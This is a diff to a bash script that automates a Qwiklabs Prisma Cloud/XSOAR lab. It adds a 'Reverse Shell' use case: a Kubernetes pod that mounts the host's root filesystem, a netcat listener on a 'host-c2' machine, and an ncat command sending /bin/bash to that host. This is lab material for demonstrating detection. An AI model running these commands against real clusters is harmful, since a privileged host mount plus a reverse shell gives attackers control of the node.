@@ -85,6 +85,51 @@ Now Configure XSOAR  as instructed from Qwiklabs start page
 ${RESET}"
 echo "${BOLD}${CYAN}YOUR Prisma Cloud EXTERNAL IP : $TWISTLOCK_EXTERNAL_IP${RESET}"
 
+read -p "${BOLD}${YELLOW}DOne Manually till 'Real World Use Case: Reverse Shell' ? (y/n) ${RESET}: " MANUAL_STEP_DONE 
+while [ $MANUAL_STEP_DONE != y ];
+do sleep 20 && read -p "${BOLD}${YELLOW}DOne Manually till 'Real World Use Case: Reverse Shell' ? (y/n) ${RESET}: " MANUAL_STEP_DONE ;
+done
+
+
+cat > reverse.yaml << EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: shell-pod
+  labels:
+    app: shell
+spec:
+  containers:
+  - name: shell
+    image: danielma911/ncat:v1
+    volumeMounts:
+    - mountPath: /host
+      name: hostvolume
+    command: ["/bin/sh"]
+    args: ["-c", "while true; do sleep 100000;done"]
+  volumes:
+  - name: hostvolume
+    hostPath:
+      path: /
+      type: Directory
+EOF
+kubectl create -f reverse.yaml
+export EXTERNAL_IP_HOST_C2=$(gcloud compute instances list --filter='name:host-c2' --format='value(EXTERNAL_IP)')
+echo "${BOLD}${YELLOW}
+
+Run this in host-c2 ssh:
+${BG_RED}
+sudo nc -lv 80
+exit
+
+${RESET}${BOLD}${YELLOW}
+then run this in another terminal:
+${BG_RED}
+kubectl exec --stdin --tty shell-pod -- /bin/bash
+ncat $EXTERNAL_IP_HOST_C2 80 -e /bin/bash
+
+${RESET}"
+gcloud compute ssh host-c2 --zone us-central1-a --quiet
 #-----------------------------------------------------end----------------------------------------------------------#
 read -p "${BOLD}${YELLOW}${BOLD}${YELLOW}Remove files?(y/n)" CONSENT_REMOVE && echo "${RESET}"
 
